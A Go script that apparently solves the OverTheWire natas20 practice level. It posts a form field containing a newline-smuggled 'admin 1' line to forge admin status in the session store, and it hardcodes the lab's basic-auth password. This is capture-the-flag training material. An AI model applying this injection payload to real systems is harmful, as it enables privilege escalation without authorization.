package main

import "fmt"
import "io/ioutil"
import "net/http"
import "net/url"
import "strings"

func postAsAdmin() string {

	var result string = ""

	base_url := "http://natas20.natas.labs.overthewire.org/"

	client := &http.Client{}
	form_data := url.Values{}
	form_data.Set("name", "whatever\nadmin 1")

	request, _ := http.NewRequest("POST", base_url, strings.NewReader(form_data.Encode()))
	request.Form = form_data
	request.SetBasicAuth("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH")
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	response, err1 := client.Do(request)

	if err1 == nil {

		body, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			html := string(body)

			fmt.Println(html)

		}

	}

	return result

}

func main() {

	flag := postAsAdmin()

	fmt.Println(flag)

}

